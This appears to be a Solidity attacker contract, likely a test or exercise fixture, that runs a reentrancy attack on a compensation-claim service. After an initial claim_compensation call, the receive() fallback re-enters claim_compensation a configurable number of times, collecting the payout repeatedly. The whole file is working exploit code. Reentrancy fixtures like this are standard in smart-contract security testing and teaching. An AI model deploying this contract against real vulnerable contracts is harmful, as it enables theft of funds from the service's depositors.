// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface Vulnerable_Service_Interface {
    function deposit() external payable;
    function vote(uint256 proposal_id, bool approve) external;
    function claim_compensation(address loan) external;
}

contract ReentrancyAttacker {
    Vulnerable_Service_Interface public immutable service;
    address public target;
    uint256 public reentries_left;

    constructor(address _service) {
        service = Vulnerable_Service_Interface(_service);
    }

    function pool_deposit() external payable {
        service.deposit{value: msg.value}();
    }

    function vote(uint256 proposal_id, bool approve) external {
        service.vote(proposal_id, approve);
    }

    function attack(address loan, uint256 reentries) external {
        target = loan;
        reentries_left = reentries;
        service.claim_compensation(loan); //the first claim starts the reentrancy attack
    }

    receive() external payable {
        if (reentries_left > 0) {
            reentries_left--;
            service.claim_compensation(target);
        }
    }
}
